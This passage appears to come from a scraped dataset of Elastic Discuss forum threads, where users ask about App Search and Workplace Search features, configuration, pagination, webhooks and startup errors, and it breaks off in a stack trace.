    "body": "Hello, everybody, I just happened to come across the APP search and installed it. At first sight it looks very good! Just one question, currently I have extended my Elasticsearch-queries with a rank_feature query... Is it possible to include the rank_feature in the APP-search to calculate the relevance?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "291e81cd-9378-4f79-ad95-a62b6f99ff4b",
    "url": "https://discuss.elastic.co/t/modeling-non-tokenized-text-fields/187703",
    "title": "Modeling non-tokenized text fields",
    "category": [
      "App Search"
    ],
    "author": "omairkhawaja",
    "date": "June 27, 2019, 2:32am June 28, 2019, 3:51pm July 26, 2019, 3:51pm",
    "body": "Hi, While reading the App Search documentation, I was unable to find out how to model text fields that should not be tokenized/analyzed (e.g. ISBN numbers)? How should these be modeled in App Search?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4019c091-7471-4e4b-8504-3cab253c1a97",
    "url": "https://discuss.elastic.co/t/default-password-for-elasticsearch-app-search/187625",
    "title": "Default password for ElasticSearch App Search",
    "category": [
      "App Search"
    ],
    "author": "omairkhawaja",
    "date": "June 26, 2019, 6:15pm June 28, 2019, 3:48pm June 28, 2019, 3:48pm June 28, 2019, 5:18am June 28, 2019, 6:14am June 28, 2019, 3:48pm July 26, 2019, 3:49pm",
    "body": "I've followed the documentation and successfully enabled standard authentication on my ElasticSearch and spun up an ElsaticSearch App Search instance. My question is: What is the default password for Elastic Search app search image.jpg703×663 79.2 KB I tried app-search@example.com/changeme and that did not work.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "9a872ddf-72a4-4884-87e9-e718083b9c14",
    "url": "https://discuss.elastic.co/t/initial-using-appsearch/186282",
    "title": "Initial using AppSearch",
    "category": [
      "App Search"
    ],
    "author": "tales",
    "date": "June 18, 2019, 2:27pm June 25, 2019, 11:12am June 25, 2019, 12:14pm June 26, 2019, 6:54am June 26, 2019, 1:06pm June 27, 2019, 3:25pm June 27, 2019, 4:19pm June 28, 2019, 12:39pm June 28, 2019, 1:12pm July 26, 2019, 1:12pm",
    "body": "I've started with AppSearch by Swiftype.com to tests, but i have some doubts. How many documents can i ingest with trial version? I trying to ingest around +- 5,000 documents, but i can't make it. There're no errors. If anybody can help me, i'll appreciate. Regards Tales Macedo",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "c4b9a010-5860-41e4-8d0e-1414594f31b3",
    "url": "https://discuss.elastic.co/t/how-to-search-with-pagination-in-search-app/187709",
    "title": "How to search with pagination in search app?",
    "category": [
      "App Search"
    ],
    "author": "Ricky_Tokdis",
    "date": "June 27, 2019, 3:47am June 27, 2019, 6:52am June 27, 2019, 10:33am June 27, 2019, 4:05pm June 28, 2019, 2:29am June 28, 2019, 2:33am July 1, 2019, 10:45am July 26, 2019, 7:46am",
    "body": "https://xxxxxxxxxx.swiftype.com/api/as/v1/engines/xxxxxxxx/search?page[size]=15&page[current]=2&query=jam&filters[is_deleted]=0&sort[total_sold]=desc This my error : \"Page contains invalid option: size; must be an integer\", \"Page contains invalid option: current; must be an integer\" how to can i to fix this error help me please",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "f78e627f-8f61-47ff-829d-c25b3e3b2261",
    "url": "https://discuss.elastic.co/t/modeling-data-to-support-nested-queries/187701",
    "title": "Modeling data to support nested queries",
    "category": [
      "App Search"
    ],
    "author": "omairkhawaja",
    "date": "June 27, 2019, 2:27am June 28, 2019, 7:44am July 26, 2019, 7:44am",
    "body": "Hi, I noticed that App Search does not support nested object types (Schema Design). What data model would you suggest in order to support the data model and query given below? e.g. my data model is: course (1) -- (*) section section properties: campus semester I would like the query to return all courses containing a section offered in Summer 2019 (semester) at the Loyalist campus",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "88ed6fb8-8c05-4e1f-952b-18d5d5863beb",
    "url": "https://discuss.elastic.co/t/returning-results-with-a-relevancy-score-of-0-when-sort-field-is-passed/187314",
    "title": "Returning results with a relevancy score of 0 when sort field is passed",
    "category": [
      "App Search"
    ],
    "author": "Harry_Knowles",
    "date": "June 25, 2019, 11:24am June 26, 2019, 7:46am July 24, 2019, 7:46am",
    "body": "When passing a sort field, the client seems to be returning results with a relevancy score of 0. Should these not be excluded completely as they are not relevant to the search term? We have a sort by price field. When selecting either low or high, it seems to be returning our most expensive, or inexpensive indexed product and doesn't check if the relevancy score is above 0. Initially posted this as an issue on the javascript API client GitHub page, however, they have mentioned this is an API issue and should be posted here. https://github.com/swiftype/swiftype-app-search-javascript/issues/61 Thanks for any help.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0fa72bbd-49e0-4ca9-9952-e53b1a1b9c1f",
    "url": "https://discuss.elastic.co/t/instalacao-configuracao-inicial-app-search/186153",
    "title": "Instalação configuração inicial App Search",
    "category": [
      "App Search"
    ],
    "author": "tales",
    "date": "June 17, 2019, 8:36pm June 25, 2019, 11:23am June 26, 2019, 6:58am July 24, 2019, 6:58am",
    "body": "Boa tarde, Estou começando testes com o App Search (on promisse), segui todos os procedimentos de instalação e configuração, porém quando vou iniciar o serviço não consigo. Se alguém puder me ajudar. image.png853×420 28.2 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e57ea36a-5fec-4d8b-ab5f-2f1ac3a30540",
    "url": "https://discuss.elastic.co/t/when-elastic-app-search-support-elasticsearch-7-0/177511",
    "title": "When Elastic App Search support Elasticsearch 7.0?",
    "category": [
      "App Search"
    ],
    "author": "tuyndv",
    "date": "April 23, 2019, 2:21am May 16, 2019, 4:31pm July 8, 2019, 5:15pm",
    "body": "Dear Team, Version current (Elastic App Search Beta 4) Verify these prerequisites: Java 8 or Java 11 is installed, and Elasticsearch >= 6.6.x, < 7 is installed and running. Elasticsearch requires at least a Basic license. When Elastic App Search support Elasticsearch 7.0? Best Regards",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1cbc021a-dd78-4bcb-a1ad-af43a6386694",
    "url": "https://discuss.elastic.co/t/what-is-the-licensing-model-for-app-search/185732",
    "title": "What is the licensing model for App Search?",
    "category": [
      "App Search"
    ],
    "author": "",
    "date": "June 13, 2019, 10:24pm June 13, 2019, 10:15pm June 13, 2019, 10:24pm June 13, 2019, 10:37pm June 25, 2019, 8:11pm July 23, 2019, 8:10pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "bd9034fa-d63c-4d43-9ab9-5e920203abbe",
    "url": "https://discuss.elastic.co/t/cant-use-filtering-negation/185325",
    "title": "Can't use filtering negation",
    "category": [
      "App Search"
    ],
    "author": "BestBenjamin",
    "date": "June 12, 2019, 5:22am June 12, 2019, 6:14am June 12, 2019, 10:50am July 10, 2019, 10:00am",
    "body": "Hello, I have a problem with filtering negation. It not return anything when get a result,but when I remove '!' out.It works properly.So,I want to know if this filter is still working. Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "75cafd11-71de-48f1-9fdc-a4d04546b625",
    "url": "https://discuss.elastic.co/t/language-support-in-standard-plan/175733",
    "title": "Language support in Standard plan",
    "category": [
      "App Search"
    ],
    "author": "kuraga",
    "date": "April 7, 2019, 7:48pm April 8, 2019, 11:26am April 8, 2019, 11:26am May 6, 2019, 11:26am",
    "body": "Good day! As of plans' description, Standard plan doesn't have multilingual support. So, only one language is supported. But which? English only, or on my decision? Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2a43c5c8-1224-439b-9761-b524723e0309",
    "url": "https://discuss.elastic.co/t/we-are-trying-to-figure-out-how-to-return-the-facets-summary-from-a-search/172563",
    "title": "We are trying to figure out how to return the facets summary from a search",
    "category": [
      "App Search"
    ],
    "author": "David_Williams1",
    "date": "March 15, 2019, 3:48pm April 8, 2019, 11:13pm March 15, 2019, 4:55pm March 15, 2019, 6:06pm April 12, 2019, 6:20pm",
    "body": "We are in the evaluation stage of using AppSearch for a web environment and are having trouble understanding the method of returning the facets summary. We build our query and successfully get results but at no time do we get a summary of facet item counts. I know we are likely missing something simple but we cannot see to find it in the documentation.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e5e3e00c-d414-4c1b-8771-7a3d6e59cc04",
    "url": "https://discuss.elastic.co/t/time-mismatch-in-kibana/171922",
    "title": "Time mismatch in kibana",
    "category": [
      "App Search"
    ],
    "author": "Carrie4456",
    "date": "March 12, 2019, 10:40am March 12, 2019, 3:57pm March 12, 2019, 3:58pm",
    "body": "We are having ELK setup with Kibana version 5.6.10. We are facing a time mismatch in displaying logs from different servers. We are fetching log from 8 IIS server and parsing via Logstash to Elastic search Kibana. While filtering logs for past hour we could notice only 2 server logs were displayed. We have checked filebeat configuration in each IIS servers and found same configuration setup; kroger feedback also verified IIS log time format and other configurations. We could see indexing is happening properly in Elastic Search but while filtering the display option for an hour only throwing results for 2 servers. If we filter for four hours we can see multiple servers with the different time value in the display. Would like to know anyone facing a similar issue and welcoming solution for it.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fa70b0d3-30f1-4510-b9cd-002b7c414591",
    "url": "https://discuss.elastic.co/t/self-managed-app-search-roadmap-question/170836",
    "title": "Self-Managed App Search Roadmap Question",
    "category": [
      "App Search"
    ],
    "author": "rockybean",
    "date": "March 5, 2019, 8:00am March 6, 2019, 1:42am March 6, 2019, 1:42am April 3, 2019, 1:42am",
    "body": "Hi, I saw app search has released beta version and I tried a bit. We really enjoy this solution. I have follow up questions. 1.Will this product be commercial like ece? 2.Will this product run on ece or just be managed by user in their own env? 3.Can you share some roadmap for this self-managed app search product? For example, when will this product be released finally? How much will this product cost? thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2a69c015-a523-40f2-814b-9955d6b346c4",
    "url": "https://discuss.elastic.co/t/pre-fetch-min-and-max-price-field-for-filtering-a-query/169370",
    "title": "Pre-fetch min and max price field for filtering a query",
    "category": [
      "App Search"
    ],
    "author": "itsliamjones",
    "date": "February 21, 2019, 10:06am February 21, 2019, 1:34pm February 21, 2019, 4:32pm March 21, 2019, 4:31pm",
    "body": "Hi, I'm looking at adding mix-max price sliders to our search instance and need to find out the mix and max price available for the initial query. In Elasticsearch I have the min, max, and stat aggregations that allow me to pre-fetch this data before filtering. Can't find anything similar for Swiftype? Note: Our catalogue is pretty large and the prices range from pennies to thousands, due to this I can't make a best guess at min and max. Thanks, Liam",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4ab524cb-a982-42a6-a93a-4c03713171f1",
    "url": "https://discuss.elastic.co/t/filter-array-contains-only/167593",
    "title": "Filter array contains only",
    "category": [
      "App Search"
    ],
    "author": "steverob",
    "date": "February 8, 2019, 9:10am February 8, 2019, 5:03pm March 8, 2019, 5:04pm",
    "body": "Is it possible to use the Filter API to find documents with an array field that contains only the specified values? Eg. I need to find documents with {array_attr: [\"A\", \"B\", \"C\"]}. I do not want documents that may have {array_attr: [\"A\", \"B\", \"C\", \"D\"]}",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "42779fd6-6ea5-4e0a-8add-161faabf0ffb",
    "url": "https://discuss.elastic.co/t/self-managed-elastic-app-search-beta/167397",
    "title": "Self-Managed Elastic App Search Beta",
    "category": [
      "App Search"
    ],
    "author": "Ismail_Mayat",
    "date": "February 7, 2019, 8:42am February 7, 2019, 6:26pm March 7, 2019, 6:26pm",
    "body": "I have been having a play with app search beta and have something up and running. My question is for the elastic part of it any recommends on setup of elastic i.e no of clusters / shards etc? Regards Ismail",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "eab207ed-1968-4696-b876-9231d991f742",
    "url": "https://discuss.elastic.co/t/how-can-we-import-sql-server-data-into-elastic-appsearch/163577",
    "title": "How can we import sql server data into elastic appsearch",
    "category": [
      "App Search"
    ],
    "author": "sanupadh",
    "date": "January 9, 2019, 7:55pm February 6, 2019, 4:13pm",
    "body": "how to call search API /engine (ex: https://host-api.swiftype.com/api/as/v1/engines/esappsearch/documents ) using c#. can we have textbox autocomplete search using code written in c#/ also how can we import sql server data into elastic appsearch",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5a5a2484-f54e-43ee-9ed0-e56b9baaca87",
    "url": "https://discuss.elastic.co/t/how-to-create-a-webhook-for-appsearch-from-contentful/162192",
    "title": "How to create a webhook for Appsearch from Contentful",
    "category": [
      "App Search"
    ],
    "author": "venu.pgi",
    "date": "January 3, 2019, 9:46pm January 2, 2019, 2:47pm January 2, 2019, 3:12pm January 30, 2019, 3:12pm",
    "body": "HI, I have created a webhook from contentful cms like below, using post method. POST: https://host-ucy3pj.api.swiftype.com/api/as/v1/engines/national-parks-demo/documents. But it fails to send data into the Appsearch. Below is the error I get in the Response body. Response body { \"error\": \"You need to sign in or sign up before continuing.\" } With a status : \"status\": \"401 Unauthorized\". Obviously I can understand we need to send the private key as well. However when I try to add the private key in the options, my contentful does not accept, it throws error \"Please provide a valid webhook URL.\" when I try to set the webhook in the below format. https://host-ucy3pj.api.swiftype.com/api/as/v1/engines/national-parks-demo/documents -H 'Content-Type: application/json' -H 'Authorization: Bearer private-REDACTED' Could you please suggest how to create a webhook from any system into the Appsearch Endpoint? This is very crucial for our project as we intend to send the data from our contentful into the Appsearch, and then our MobileApp must be able to show results from the Appsearch index. Please provide your valuable inputs.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "73f94909-f53a-4e9b-bafa-c61f0247e99b",
    "url": "https://discuss.elastic.co/t/unable-to-display-appsearch-data-from-frontend-using-javascript-api-swiftypeappsearch/162196",
    "title": "Unable to display Appsearch data from frontend using javascript api (SwiftypeAppSearch)",
    "category": [
      "App Search"
    ],
    "author": "venu.pgi",
    "date": "December 27, 2018, 5:07am January 2, 2019, 3:08pm January 30, 2019, 3:08pm",
    "body": "we are evaluating the ElasticSearch / Appsearch to work with our MobileApp project for a US client. So I registered for the trail version and created a engine. Also trying to connect to the Appsearch using the sample code given at the github. GitHub swiftype/swiftype-app-search-javascript Swiftype App Search Javascript Client. Contribute to swiftype/swiftype-app-search-javascript development by creating an account on GitHub. Attached is the test code we have written, using the approach given in the github. However it is not working giving some errors. I am attaching the code, errors and the credentials. Kindly forward to some one who can help us to integrate our MobileApp with your Appsearch product. Here is the code with I am using: https://drive.google.com/file/d/19x1bwagtockP8sYtYm6KBmLjr3cVJUZJ/view?usp=sharing And the error message can be seen here: https://drive.google.com/file/d/1luD2qVZl1zZnX7CFcv4b6gSnppqPqYBO/view?usp=sharing Secondly, we are really looking for a example app code with a searchbox which can connect to your Appsearch Engine and get some results. Kindly help us with an example.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e7020317-ae75-41f0-ade6-0f900e990900",
    "url": "https://discuss.elastic.co/t/fetching-all-docs-in-an-app-search-index/159918",
    "title": "Fetching all docs in an app search index",
    "category": [
      "App Search"
    ],
    "author": "frankjoh2",
    "date": "December 7, 2018, 11:22am December 7, 2018, 11:56am December 7, 2018, 5:40pm December 10, 2018, 12:14pm December 10, 2018, 9:23pm January 7, 2019, 9:23pm",
    "body": "Hi, I'm trying to get the ids of all documents in my app search index. I tried to simply iteration of searches with an empty query and incrementally increasing the page-number. This seemed to work fine for the first 10 requests. This is what my requests looks like: { \"query\": \"\", \"result_fields\": { \"id\": { \"raw\": {} } }, \"page\": {\"size\": 1000,\"current\": [PAGENUMER] } } Where [PAGENUMBER] is 1 for the first request, 2 for second and so on… This is the result of the 10th request: { \"meta\": { \"warnings\": [], \"page\": { \"current\": 10, \"total_pages\": 92, \"total_results\": 91035, \"size\": 1000 }, \"request_id\": \"39684c716fe14725a70406a1a71789e4\" }, \"results\": [...] <--- 1000 results here } Working as expected and showing all 91035 docs in the index and that there are a total of 92 pages. But the result of the 11th request: { \"meta\": { \"warnings\": [], \"page\": { \"current\": 11, \"total_pages\": 0, \"total_results\": 0, \"size\": 1000 }, \"request_id\": \"39684c716fe14725a70406a1a71789e4\" }, \"results\": [] <--- 0 results here } Suddenly it indicates that there are no docs found at all… The documentation says that search-request should support up to 1000 in page size and up to 500 pages, but it seems like it supports max 10 pages when page-size is 1000. Or is there some setting I need to change to support more result-pages? Or is there some other way I can request ids of all docs in the index? Any help would be appreciated",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "d1f467d9-c108-436a-86b7-80dc28bb306d",
    "url": "https://discuss.elastic.co/t/new-name-same-great-product-elastic-workplace-search/217075",
    "title": "New name (same great product): Elastic Workplace Search",
    "category": [
      "Enterprise Search"
    ],
    "author": "dadoonet",
    "date": "January 29, 2020, 8:42pm January 29, 2020, 8:43pm March 31, 2020, 2:01pm",
    "body": "The product formerly known as Enterprise Search has been renamed to Workplace Search. However, you’ll still see the forum category for Enterprise Search (you’re in it right now, after all). This category is where you can post questions/comments/feedback about the Elastic Enterprise Search solution and its two marquee products: Workplace Search and App Search.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e640d5fa-2258-4dab-9710-5c7e45bbb01a",
    "url": "https://discuss.elastic.co/t/do-we-need-to-create-a-a-search-before-creating-a-visualization/226961",
    "title": "Do we need to create a a search before creating a visualization?",
    "category": [
      "Enterprise Search"
    ],
    "author": "MSP85",
    "date": "April 7, 2020, 5:17pm",
    "body": "do we need to create a a search before creating a visualization? We have created a search and an associated visualization which we intend to replicate for few more apps in the suite. I wanted to understand if its mandatory to create a search before create a visualization.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "29c22b02-cd00-4b7b-9788-3cc8ce137ee7",
    "url": "https://discuss.elastic.co/t/sharepoint-online-connector/226774",
    "title": "SharePoint Online Connector",
    "category": [
      "Enterprise Search"
    ],
    "author": "hoffman",
    "date": "April 6, 2020, 8:29pm",
    "body": "Hi All - We are having difficulty connecting Workplace search and SharePoint Online. We have followed the docs, had multiple people verify the setup but we can not get the o365 authenticated. We get Message: AADSTS50011: The reply URL specified in the request does not match the reply URLs configured for the application: 'b106c3af-d1fe-4588-b10c-3f0c49811ede'. Would greatly appreciate any help.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "0bf71fac-4059-4852-9516-f263e46e1f2e",
    "url": "https://discuss.elastic.co/t/creating-a-custom-search-ui-with-elastic-workplace-search/222506",
    "title": "Creating a custom search ui with elastic workplace search",
    "category": [
      "Enterprise Search"
    ],
    "author": "yibojiang",
    "date": "March 6, 2020, 7:23pm March 6, 2020, 8:05pm March 6, 2020, 8:30pm",
    "body": "We have our custom sources as well Jira Cloud, Confluence, Dropbox, Google Drive and we want to build a search dashboard include all of them. Workplace Search is perfect for connecting these sources, but there’s not much customization on the search dashboard. I’m looking to for solution build with my custom search dashboard with the Workplace search. I know with App Search and Site Search there’s Search API so you can build the search dashboard on top of search-ui. But I don’t see the APIs exist in Workplace Search. Do we have to build our own search-ui connectors for the Workplace search? Anyone has any suggestions on that ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3532859c-e28e-43d0-ace8-3df79b5c1f15",
    "url": "https://discuss.elastic.co/t/azure-public-ip/222405",
    "title": "Azure public ip",
    "category": [
      "Enterprise Search"
    ],
    "author": "Mohamed_Alawami",
    "date": "March 6, 2020, 4:48am",
    "body": "I am using Azure for enterprise search. However, when I connect the content source like google drive it is not allow to redirect to raw ip. Can you please support",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "622540cf-7a26-4578-86d5-d9ae0e74b5de",
    "url": "https://discuss.elastic.co/t/enterprise-search-failes-to-load/219341",
    "title": "Enterprise-search failes to load",
    "category": [
      "Enterprise Search"
    ],
    "author": "manosmustang",
    "date": "February 14, 2020, 9:49am February 14, 2020, 9:50am February 14, 2020, 1:47pm February 17, 2020, 2:39pm February 17, 2020, 2:39pm",
    "body": "Hello, I am trying to start an enterprise-search at an existing elasticsearch cluster while starting the enterprise-search i get the below error > [root@elasticlogs bin]# ./enterprise-search > Found java executable in PATH > Java version: 1.8.0_242 > > Starting the following Elastic Enterprise Search stack components: > - An application server, as well as background worker threads > - A pool of connectors > - A filebeat instance for indexing logs > > forego | starting app-server.1 on port 5000 > forego | starting filebeat.1 on port 5100 > forego | starting connectors.1 on port 5300 > filebeat.1 | scripting container class loader urls: [file:/tmp/jruby2484594959289077476extract/lib/jruby-stdlib-9.2.9.0.jar, file:/tmp/jruby2484594959289077476extract/lib/jruby-rack-1.1.21.jar, file:/tmp/jruby2484594959289077476extract/lib/jruby-core-9.2.9.0-complete.jar, file:/tmp/jruby2484594959289077476extract/lib/jruby-rack-worker_0.14.1.jar] > connectors.1 | scripting container class loader urls: [file:/tmp/jruby1939297861825022508extract/lib/jruby-stdlib-9.2.9.0.jar, file:/tmp/jruby1939297861825022508extract/lib/jruby-rack-1.1.21.jar, file:/tmp/jruby1939297861825022508extract/lib/jruby-core-9.2.9.0-complete.jar, file:/tmp/jruby1939297861825022508extract/lib/jruby-rack-worker_0.14.1.jar] > app-server.1 | scripting container class loader urls: [file:/tmp/jruby7107592493328148448extract/lib/jruby-stdlib-9.2.9.0.jar, file:/tmp/jruby7107592493328148448extract/lib/jruby-rack-1.1.21.jar, file:/tmp/jruby7107592493328148448extract/lib/jruby-core-9.2.9.0-complete.jar, file:/tmp/jruby7107592493328148448extract/lib/jruby-rack-worker_0.14.1.jar] > filebeat.1 | setting GEM_HOME to /tmp/jruby2484594959289077476extract/gems > filebeat.1 | ... and BUNDLE_GEMFILE to /tmp/jruby2484594959289077476extract/Gemfile > filebeat.1 | loading resource: /tmp/jruby2484594959289077476extract/./META-INF/rails.rb > filebeat.1 | invoking /tmp/jruby2484594959289077476extract/./META-INF/rails.rb with: [runner, FritoTogo.start_filebeat!] > app-server.1 | setting GEM_HOME to /tmp/jruby7107592493328148448extract/gems > app-server.1 | ... and BUNDLE_GEMFILE to /tmp/jruby7107592493328148448extract/Gemfile > connectors.1 | setting GEM_HOME to /tmp/jruby1939297861825022508extract/gems > connectors.1 | ... and BUNDLE_GEMFILE to /tmp/jruby1939297861825022508extract/Gemfile > app-server.1 | loading resource: /tmp/jruby7107592493328148448extract/./META-INF/rails.rb > app-server.1 | invoking /tmp/jruby7107592493328148448extract/./META-INF/rails.rb with: [runner, FritoTogo.start_app_server!] > connectors.1 | loading resource: /tmp/jruby1939297861825022508extract/./META-INF/rails.rb > connectors.1 | invoking /tmp/jruby1939297861825022508extract/./META-INF/rails.rb with: [runner, Connectors.start!] > filebeat.1 | [2020-02-14T09:35:39.889+00:00][19972][2002][filebeat][ERROR]: > filebeat.1 | -------------------------------------------------------------------------------- > filebeat.1 | > filebeat.1 | Elastic Enterprise Search requires Elasticsearch security features to be enabled. > filebeat.1 | Please enable Elasticsearch security features as outlined here: > filebeat.1 | https://swiftype.com/documentation/enterprise-search/installation > filebeat.1 | > filebeat.1 | -------------------------------------------------------------------------------- > filebeat.1 | > filebeat.1 | > filebeat.1 | ERROR: org.jruby.exceptions.SystemExit: (SystemExit) exit > filebeat.1 | org.jruby.exceptions.SystemExit: (SystemExit) exit > filebeat.1 | at org.jruby.RubyKernel.exit(org/jruby/RubyKernel.java:751) > filebeat.1 | at org.jruby.RubyKernel.exit(org/jruby/RubyKernel.java:714) > filebeat.1 | at RUBY.fatal_error(/tmp/jruby2484594959289077476extract/shared_togo/lib/shared_togo.class:738) > filebeat.1 | at RUBY.check_elasticsearch_features!(/tmp/jruby2484594959289077476extract/frito_togo/lib/frito_togo.class:87) > filebeat.1 | at RUBY.configure!(/tmp/jruby2484594959289077476extract/shared_togo/lib/shared_togo.class:168) > filebeat.1 | at RUBY.configure!(/tmp/jruby2484594959289077476extract/shared_togo/lib/shared_togo.class:32) > filebeat.1 | at RUBY.<main>(/tmp/jruby2484594959289077476extract/config/application.class:24) > filebeat.1 | at org.jruby.RubyKernel.load(org/jruby/RubyKernel.java:1013) > filebeat.1 | at RUBY.<main>(/tmp/jruby2484594959289077476extract/config/application.rb:1) > filebeat.1 | at org.jruby.RubyKernel.require(org/jruby/RubyKernel.java:978) > filebeat.1 | at RUBY.<main>(/tmp/jruby2484594959289077476extract/gems/gems/railties-4.2.11.1/lib/rails/commands/runner.rb:51) > filebeat.1 | at org.jruby.RubyKernel.require(org/jruby/RubyKernel.java:978) > filebeat.1 | at RUBY.require_command!(/tmp/jruby2484594959289077476extract/gems/gems/railties-4.2.11.1/lib/rails/commands/commands_tasks.rb:123) > filebeat.1 | at RUBY.runner(/tmp/jruby2484594959289077476extract/gems/gems/railties-4.2.11.1/lib/rails/commands/commands_tasks.rb:90) > filebeat.1 | at RUBY.run_command!(/tmp/jruby2484594959289077476extract/gems/gems/railties-4.2.11.1/lib/rails/commands/commands_tasks.rb:39) > filebeat.1 | at RUBY.<main>(/tmp/jruby2484594959289077476extract/gems/gems/railties-4.2.11.1/lib/rails/commands.rb:17) > filebeat.1 | at org.jruby.RubyKernel.require(org/jruby/RubyKernel.java:978) > filebeat.1 | at RUBY.<main>(/tmp/jruby2484594959289077476extract/./META-INF/rails.rb:7) > forego | sending SIGTERM to app-server.1 > forego | sending SIGTERM to connectors.1 > app-server.1 | ERROR: java.lang.reflect.InvocationTargetException > app-server.1 | java.lang.NoClassDefFoundError: org/jruby/runtime/load/JarredScript > app-server.1 | at org.jruby.runtime.load.LoadService.isJarfileLibrary(LoadService.java:653) > app-server.1 | at org.jruby.runtime.load.LoadService.tryLoadingLibraryOrScript(LoadService.java:907) > app-server.1 | at org.jruby.runtime.load.LoadService.smartLoadInternal(LoadService.java:535) > app-server.1 | at org.jruby.runtime.load.LoadService.require(LoadService.java:402) > app-server.1 | at org.jruby.RubyKernel.requireCommon(RubyKernel.java:985) > app-server.1 | at org.jruby.RubyKernel.require(RubyKernel.java:978) > app-server.1 | at org.jruby.RubyKernel$INVOKER$s$1$0$require.call(RubyKernel$INVOKER$s$1$0$require.gen) > app-server.1 | at org.jruby.internal.runtime.methods.JavaMethod$JavaMethodOneOrNBlock.call(JavaMethod.java:417) > app-server.1 | at org.jruby.internal.runtime.methods.AliasMethod.call(AliasMethod.java:95) > app-server.1 | at org.jruby.runtime.callsite.CachingCallSite.cacheAndCall(CachingCallSite.java:375) > app-server.1 | at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:174) > app-server.1 | at tmp.jruby7107592493328148448extract.$_dot_.META_minus_INF.rails.invokeOther8:require(/tmp/jruby7107592493328148448extract/./META-INF/rails.rb:7) > app-server.1 | at tmp.jruby7107592493328148448extract.$_dot_.META_minus_INF.rails.RUBY$script(/tmp/jruby7107592493328148448extract/./META-INF/rails.rb:7) > app-server.1 | at java.lang.invoke.MethodHandle.invokeWithArguments(MethodHandle.java:627) > app-server.1 | at org.jruby.ir.Compiler$1.load(Compiler.java:89) > app-server.1 | at org.jruby.Ruby.runScript(Ruby.java:857) > app-server.1 | at org.jruby.Ruby.runNormally(Ruby.java:780) > app-server.1 | at org.jruby.Ruby.runNormally(Ruby.java:798) > app-server.1 | at org.jruby.Ruby.runFromMain(Ruby.java:610) > app-server.1 | at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) > app-server.1 | at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) > app-server.1 | at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) > app-server.1 | at java.lang.reflect.Method.invoke(Method.java:498) > app-server.1 | at JarMain.invokeMethod(JarMain.java:263) > app-server.1 | at WarMain.launchJRuby(WarMain.java:263) > app-server.1 | at JarMain.start(JarMain.java:158) > app-server.1 | at WarMain.start(WarMain.java:357) > app-server.1 | at JarMain.doStart(JarMain.java:233) > app-server.1 | at WarMain.main(WarMain.java:367) > connectors.1 | ERROR: java.lang.reflect.InvocationTargetException > connectors.1 | java.lang.NoClassDefFoundError: org/jruby/runtime/load/JarredScript > connectors.1 | at org.jruby.runtime.load.LoadService.isJarfileLibrary(LoadService.java:653) > connectors.1 | at org.jruby.runtime.load.LoadService.tryLoadingLibraryOrScript(LoadService.java:907) > connectors.1 | at org.jruby.runtime.load.LoadService.smartLoadInternal(LoadService.java:535) > connectors.1 | at org.jruby.runtime.load.LoadService.require(LoadService.java:402) > connectors.1 | at org.jruby.RubyKernel.requireCommon(RubyKernel.java:985) > connectors.1 | at org.jruby.RubyKernel.require(RubyKernel.java:978) > connectors.1 | at org.jruby.RubyKernel$INVOKER$s$1$0$require.call(RubyKernel$INVOKER$s$1$0$require.gen) > connectors.1 | at org.jruby.internal.runtime.methods.JavaMethod$JavaMethodOneOrNBlock.call(JavaMethod.java:417) > connectors.1 | at org.jruby.internal.runtime.methods.AliasMethod.call(AliasMethod.java:95) > connectors.1 | at org.jruby.runtime.callsite.CachingCallSite.cacheAndCall(CachingCallSite.java:375) > connectors.1 | at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:174) > connectors.1 | at tmp.jruby1939297861825022508extract.$_dot_.META_minus_INF.rails.invokeOther8:require(/tmp/jruby1939297861825022508extract/./META-INF/rails.rb:7) > connectors.1 | at tmp.jruby1939297861825022508extract.$_dot_.META_minus_INF.rails.RUBY$script(/tmp/jruby1939297861825022508extract/./META-INF/rails.rb:7) > connectors.1 | at java.lang.invoke.MethodHandle.invokeWithArguments(MethodHandle.java:627) > connectors.1 | at org.jruby.ir.Compiler$1.load(Compiler.java:89) > connectors.1 | at org.jruby.Ruby.runScript(Ruby.java:857) > connectors.1 | at org.jruby.Ruby.runNormally(Ruby.java:780) > connectors.1 | at org.jruby.Ruby.runNormally(Ruby.java:798) > connectors.1 | at org.jruby.Ruby.runFromMain(Ruby.java:610) > connectors.1 | at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) > connectors.1 | at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) > connectors.1 | at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) > connectors.1 | at java.lang.reflect.Method.invoke(Method.java:498) > connectors.1 | at 